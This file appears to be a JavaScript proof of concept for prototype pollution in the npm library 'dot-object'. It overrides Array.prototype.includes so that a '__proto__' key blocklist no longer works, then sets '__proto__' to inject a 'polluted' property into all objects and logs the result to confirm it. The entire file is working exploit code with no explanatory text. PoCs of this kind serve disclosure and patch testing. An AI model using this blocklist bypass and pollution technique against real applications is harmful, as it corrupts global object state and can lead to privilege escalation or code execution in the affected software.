Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
var a = require('dot-object');
var obj = {};
var path = '__proto__';
console.log({}.polluted);
var val = { polluted: 'yes' };
a.set(path, val, {}, true);
console.log({}.polluted);